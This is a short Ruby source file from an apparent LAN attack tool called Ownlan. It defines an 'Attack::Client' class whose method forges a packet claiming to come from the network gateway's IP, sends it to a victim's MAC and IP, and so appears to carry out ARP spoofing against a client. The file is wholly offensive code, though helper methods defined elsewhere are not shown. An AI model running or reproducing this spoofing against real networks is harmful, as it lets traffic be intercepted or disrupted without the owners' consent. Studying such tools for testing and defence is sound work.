module Ownlan
  module Attack
    class Client < Base

      def process
        gw_ip      = ServiceObjects::NetworkInformation.gateway_ip

        saddr    = config.source_mac
        daddr    = victim_mac
        saddr_ip = gw_ip
        daddr_ip = victim_ip

        crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip).call

        send_packet(config, crafted_packet)
      end
    end
  end
end
